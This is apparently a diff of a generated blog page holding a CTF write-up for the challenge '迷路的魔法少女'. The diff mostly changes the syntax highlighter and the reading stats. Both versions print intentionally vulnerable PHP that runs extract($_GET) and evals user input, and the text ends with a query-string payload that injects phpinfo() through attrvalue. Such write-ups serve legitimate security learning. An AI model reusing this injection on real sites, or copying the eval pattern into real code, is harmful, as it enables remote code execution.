@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -191,7 +199,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      132 字
+      107 字
     </span>
   
 
@@ -201,7 +209,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      4
+      3
        分钟
     </span>
   
@@ -238,35 +246,35 @@
             <h1 style="display: none">DAS X 吉林工师</h1>
             
             <div class="markdown-body">
-              <h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);
+              <h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-extract($_GET);
-error_reporting(<span class="hljs-number">0</span>);
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">String2Array</span>(<span class="hljs-params">$data</span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">if</span>($data == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>();
-    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$array = <span class="hljs-subst">$data</span>;&quot;</span>);
-    <span class="hljs-keyword">return</span> $array;
-&#125;
+<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">function</span> <span class="token function">String2Array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\$array = <span class="token interpolation"><span class="token variable">$data</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
 
-<span class="hljs-keyword">if</span>(is_array($attrid) &amp;&amp; is_array($attrvalue))
-&#123;
-        $attrstr .= <span class="hljs-string">&#x27;array(&#x27;</span>;
-        $attrids = count($attrid);
-        <span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;$attrids; $i++)
-        &#123;
-            $attrstr .= <span class="hljs-string">&#x27;&quot;&#x27;</span>.intval($attrid[$i]).<span class="hljs-string">&#x27;&quot;=&gt;&#x27;</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>.$attrvalue[$i].<span class="hljs-string">&#x27;&quot;&#x27;</span>;
-            <span class="hljs-keyword">if</span>($i &lt; $attrids<span class="hljs-number">-1</span>)
-            &#123;
-                $attrstr .= <span class="hljs-string">&#x27;,&#x27;</span>;
-            &#125;
-        &#125;
-        $attrstr .= <span class="hljs-string">&#x27;);&#x27;</span>;
-&#125;
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrvalue</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'array('</span><span class="token punctuation">;</span>
+        <span class="token variable">$attrids</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$attrids</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'"'</span><span class="token punctuation">.</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'"=>'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'"'</span><span class="token punctuation">.</span><span class="token variable">$attrvalue</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'"'</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$attrids</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token punctuation">&#123;</span>
+                <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">','</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">');'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
 
-String2Array($attrstr);</code></pre></div>
+<span class="token function">String2Array</span><span class="token punctuation">(</span><span class="token variable">$attrstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
 
 <p>突破点在<code>attrvalue</code>上</p>
 <p>payload：<code>?attrid[]=&amp;attrvalue[]=1&quot;,11=&gt;phpinfo(),&quot;11&quot;=&gt;&quot;2</code></p>
@@ -429,6 +437,8 @@ String2Array($attrstr);</code></pre></div>
 
 
 
+  
+    
   
 
 
